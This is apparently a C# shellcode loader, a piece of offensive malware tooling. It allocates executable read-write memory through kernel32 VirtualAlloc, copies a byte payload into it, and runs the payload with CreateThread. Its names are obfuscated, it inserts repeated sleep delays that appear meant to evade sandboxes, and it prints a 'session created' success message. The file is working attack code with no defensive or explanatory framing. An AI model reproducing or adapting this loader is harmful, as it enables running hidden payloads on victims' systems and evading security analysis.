namespace RArAtiTdkA;

using System;
using System.Runtime.InteropServices;

public static class dGVzdAo

{
    [DllImport("kernel32")]
    public static extern UInt32 VirtualAlloc(UInt32 bHBTdGFydEFkZHI, UInt32 c2l6ZQ, UInt32 Y2F0aW9uVHlwZQ, UInt32 ZmxQcm9);

    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(UInt32 RyaWJ1dGVz, UInt32 BUaHJlYR, UInt32 ydEFkZH,IntPtr GFyYW, UInt32 ZsYWdz, ref UInt32 bHBUaHJlY);

    [DllImport("kernel32")]
    public static extern UInt32 WaitForSingleObject(IntPtr aEhhbmRs, UInt32 YWRJZA);


    public static UInt32 bWRzdA = 0x1000;

    public static UInt32 ZGRy = 0x40;

    public static UInt32 VA(this UInt32 YXI, byte[] cHBkc2Y)

    {
        System.Threading.Thread.Sleep(10000);

        UInt32 ZnJ0 = VirtualAlloc(0, (UInt32)cHBkc2Y.Length, bWRzdA, ZGRy);

        System.Threading.Thread.Sleep(10000);


        return ZnJ0;
    }

    public static void CPY(this UInt32 YnJ0eQ, byte[] IHNyYw, IntPtr ZGVz)

    {
        System.Threading.Thread.Sleep(5000);

        Marshal.Copy(IHNyYw, 0, (IntPtr)(ZGVz), IHNyYw.Length);
    }

    public static IntPtr CT(this UInt32 c, UInt32 c3RhZGQ, IntPtr eGU, UInt32 cmZn)

    {
        IntPtr hThread = CreateThread(0, 0, c3RhZGQ, eGU, 0, ref cmZn);

        System.Threading.Thread.Sleep(3000);

        return hThread;
    }

    public static uint WSO(this UInt32 d, IntPtr aG4)

    {
        System.Threading.Thread.Sleep(5000);

        return WaitForSingleObject(aG4, 0xFFFFFFFF);
    }


    public class rOMcboO
    {
        public static void OQLRioRzeo(byte[] cGF5bG8)
        {
            if (cGF5bG8 != null)
            {
                UInt32 ZnVuY0FkZHIy = 1;

                UInt32 dHJ1bmNBZ = ZnVuY0FkZHIy.VA(cGF5bG8);


                System.Threading.Thread.Sleep(2000);

                Convert.ToUInt32("2").CPY(cGF5bG8, (IntPtr)(dHJ1bmNBZ));

                System.Threading.Thread.Sleep(2000);

                UInt32 tId = 0;

                System.Threading.Thread.Sleep(2000);

                IntPtr pin = IntPtr.Zero;


                System.Threading.Thread.Sleep(2000);

                Console.WriteLine("Bingo: X session created with sucess ;)");

                ZnVuY0FkZHIy.WSO(Convert.ToUInt32("3").CT(dHJ1bmNBZ, pin, tId));

                System.Threading.Thread.Sleep(1000);
            }
        }
    }
}